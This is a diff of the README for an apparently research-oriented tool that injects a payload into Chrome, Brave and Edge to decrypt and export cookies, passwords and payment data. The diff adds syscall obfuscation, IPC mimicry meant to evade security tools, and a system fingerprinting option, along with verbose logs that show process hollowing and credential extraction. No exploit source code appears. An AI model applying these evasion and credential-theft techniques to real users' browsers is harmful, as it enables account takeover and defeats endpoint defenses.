@@ -33,11 +33,14 @@ This tool's effectiveness is rooted in a combination of modern, evasion-focused 
 - 🔓 Full user-mode decryption of cookies, passwords, and payment methods.
 - 📁 Discovers and processes all user profiles (Default, Profile 1, etc.).
 - 📝 Exports all extracted data into structured JSON files, organized by profile.
+- 🔍 Browser Fingerprinting of browser metadata and system information.
 
 ### Stealth & Evasion
 
 - 🛡️ **Fileless Payload Delivery:** In-memory decryption and injection of an encrypted resource.
 - 🛡️ **Direct Syscall Engine:** Bypasses common endpoint defenses by avoiding hooked user-land APIs for all process operations.
+- 🛡️ **Syscall Obfuscation:** Runtime XOR encryption of syscall table in memory to evade detection by security tools.
+- 🛡️ **IPC Mimicry:** Browser-specific named pipe patterns that blend with legitimate browser IPC traffic.
 - 🤫 **Process Hollowing:** Creates a benign, suspended host process for the payload, avoiding injection into potentially monitored processes.
 - 👻 **Reflective DLL Injection:** Stealthily loads the payload without suspicious `LoadLibrary` calls.
 - 🔒 **Proactive File-Lock Mitigation:** Automatically terminates browser utility processes that hold locks on target database files.
@@ -57,9 +60,9 @@ This tool's effectiveness is rooted in a combination of modern, evasion-focused 
 
 | Browser            | Tested Version (x64 & ARM64) |
 | ------------------ | ---------------------------- |
-| **Google Chrome**  | 139.0.7258.139               |
-| **Brave**          | 1.81.136 (139.0.7258.143)    |
-| **Microsoft Edge** | 140.0.3485.14                |
+| **Google Chrome**  | 141.0.7390.66                |
+| **Brave**          | 1.83.109 (141.0.7390.55)     |
+| **Microsoft Edge** | 141.0.3537.57                |
 
 ## 🔬 Technical Workflow
 
@@ -119,7 +122,7 @@ _________ .__                         ___________.__                       __
         \/     \/                   \/        \/           \/           \/
 
  Direct Syscall-Based Reflective Hollowing
- x64 & ARM64 | v0.15.0 by @xaitax
+ x64 & ARM64 | v0.16.0 by @xaitax
 
 Usage:
   chrome_inject.exe [options] <chrome|brave|edge|all>
@@ -127,6 +130,7 @@ Usage:
 Options:
   --output-path|-o <path>  Directory for output files (default: .\output\)
   --verbose|-v             Enable verbose debug output from the injector
+  --fingerprint|-f         Extract browser fingerprinting data
   --help|-h                Show this help message
 
 Browser targets:
@@ -138,8 +142,6 @@ Browser targets:
 
 ### Options
 
-Options
-
 - `--output-path <path>` or `-o <path>`
   Specifies the base directory for output files.
   Defaults to `.\output\` relative to the injector's location.
@@ -147,6 +149,10 @@ Options
 
 - `--verbose` or `-v`
   Enable extensive debugging output from the injector.
+
+- `--fingerprint` or `-f`
+  Extract comprehensive browser fingerprinting data including version, extensions, security settings, and system information.
+  Results saved to `fingerprint.json` in the browser's output directory.
 
 - `--help` or `-h`
   Show this help message.
@@ -163,7 +169,7 @@ _________ .__                         ___________.__                       __
         \/     \/                   \/        \/           \/           \/
 
  Direct Syscall-Based Reflective Hollowing
- x64 & ARM64 | v0.15.0 by @xaitax
+ x64 & ARM64 | v0.16.0 by @xaitax
 
 [*] Processing 3 browser(s):
 
@@ -188,7 +194,7 @@ _________ .__                         ___________.__                       __
 #### Verbose
 
 ```bash
-PS> .\chromelevator.exe chrome -v
+PS> .\chromelevator.exe chrome -v -f
 _________ .__                         ___________.__                       __
 \_   ___ \|  |_________  ____   _____ \_   _____/|  |   _______  _______ _/  |_  ___________
 /    \  \/|  |  \_  __ \/  _ \ /     \ |    __)_ |  | _/ __ \  \/ /\__  \\   __\/  _ \_  __ \
@@ -197,23 +203,24 @@ _________ .__                         ___________.__                       __
         \/     \/                   \/        \/           \/           \/
 
  Direct Syscall-Based Reflective Hollowing
- x64 & ARM64 | v0.15.0 by @xaitax
+ x64 & ARM64 | v0.16.0 by @xaitax
 
 [#] Found and sorted 489 Zw* functions.
-[#] Initialized 19 syscall stubs.
+[#] Initialized 19 syscall stubs (with obfuscation).
+[#] Obfuscation layer active - syscalls encrypted in memory
 [#] Searching Registry for: chrome.exe
 [#] Found at: C:\Program Files\Google\Chrome\Application\chrome.exe
 [#] Scanning for and terminating browser network services...
 [#] Creating suspended Chrome process.
 [#] Target executable path: C:\Program Files\Google\Chrome\Application\chrome.exe
-[#] Created suspended process PID: 16392
+[#] Created suspended process PID: 21708
 [#] Architecture match: Injector=ARM64, Target=ARM64
-[#] Named pipe server created: \\.\pipe\b4de02e0-297f-4910-8b5a-51ee0f3804ac
+[#] Named pipe server created: \\.\pipe\chrome.sync.9707.22756.1BE8
 [#] Loading and decrypting payload DLL.
 [#] Parsing payload PE headers for ReflectiveLoader.
-[#] ReflectiveLoader found at file offset: 0x14a50
+[#] ReflectiveLoader found at file offset: 0x17930
 [#] Allocating memory for payload in target process.
-[#] Combined memory for payload and parameters allocated at: 0x24706250000
+[#] Combined memory for payload and parameters allocated at: 0x243d93a0000
 [#] Writing payload DLL to target process.
 [#] Writing pipe name parameter into the same allocation.
 [#] Changing payload memory protection to executable.
@@ -223,8 +230,9 @@ _________ .__                         ___________.__                       __
 [#] Waiting for payload to connect to named pipe.
 [#] Payload connected to named pipe.
 [#] Sent message to pipe: VERBOSE_TRUE
+[#] Sent message to pipe: FINGERPRINT_TRUE
 [#] Sent message to pipe: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output
-[#] Waiting for payload execution. (Pipe: \\.\pipe\b4de02e0-297f-4910-8b5a-51ee0f3804ac)
+[#] Waiting for payload execution. (Pipe: \\.\pipe\chrome.sync.9707.22756.1BE8)
 
 [*] Decryption process started for Chrome
 [+] COM library initialized (APARTMENTTHREADED).
@@ -234,21 +242,23 @@ _________ .__                         ___________.__                       __
 [*] Discovering browser profiles in: C:\Users\ah\AppData\Local\Google\Chrome\User Data
 [+] Found 2 profile(s).
 [*] Processing profile: Default
-     [*] 371 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\cookies.json
+     [*] 380 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\cookies.json
      [*] 1 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.json
 [*] Processing profile: Profile 1
-     [*] 110 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.json
-     [*] 1 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\passwords.json
+     [*] 131 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.json
+     [*] 2 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\passwords.json
      [*] 1 payments extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\payments.json
-[*] All profiles processed. Decryption process finished.
+[*] Extraction complete: 2 successful, 0 failed.
+[*] Extracting browser fingerprint data...
+[*] Discovering browser profiles in: C:\Users\ah\AppData\Local\Google\Chrome\User Data
+[+] Found 2 profile(s).
+[+] Browser fingerprint extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\fingerprint.json
 [#] Payload completion signal received.
 
 [#] Payload signaled completion or pipe interaction ended.
-[#] Terminating browser PID=16392 via direct syscall.
+[#] Terminating browser PID=21708 via direct syscall.
 [#] Chrome terminated by injector.
-[+]
-Extraction completed successfully
-[#] Injector finished successfully.
+[+] Extraction completed successfully
 ```
 
 ## 📂 Data Extraction
@@ -327,6 +337,36 @@ Each payment file is a JSON array of objects:
   …
 ]
 ```
+
+### 🔍 Browser Fingerprinting 
+
+When using the `--fingerprint` flag, a comprehensive metadata report is generated:
+
+```json
+{
+  "browser": "Brave",
+  "browser_version": "141.1.83.109",
+  "executable_path": "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
+  "user_data_path": "C:\\Users\\username\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
+  "sync_enabled": false,
+  "enterprise_managed": false,
+  "update_channel": "stable",
+  "default_search_engine": "Google",
+  "hardware_acceleration": true,
+  "autofill_enabled": true,
+  "password_manager_enabled": true,
+  "safe_browsing_enabled": true,
+  "installed_extensions_count": 12,
+  "extension_ids": ["abc123...", "def456...", ...],
+  "profile_count": 1,
+  "computer_name": "DESKTOP-ABC123",
+  "windows_user": "username",
+  "last_config_update": 1759127932,
+  "extraction_timestamp": 1759213456
+}
+```
+
+This data provides intelligence about the browser's configuration, security posture, and system context.
 
 ## 📚 In-Depth Technical Analysis & Research
 
